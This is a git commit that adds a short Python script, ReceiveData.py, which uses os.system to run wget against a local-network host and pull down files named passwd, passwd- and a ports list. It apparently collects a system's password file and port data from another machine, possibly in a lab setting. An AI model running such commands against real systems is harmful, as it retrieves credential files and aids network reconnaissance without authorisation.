8513aa0613a697a0afa6d9dd01eff7ef5786e580
GeeeThree <georges.nicoli@gmail.com>
2019-12-13 10:54:04 -0500

    Receives data over the network

---
+++ ReceiveData.py
@@ -0,0 +1,10 @@
+import os
+import sys
+import time
+import string
+
+os.system("wget http://192.168.1.24:55555/passwd")
+os.system("wget http://192.168.1.24:55555/passwd-")
+os.system("wget http://192.168.1.24:55555/PortsAndPortTypes.txt")
+time.sleep(10)
+
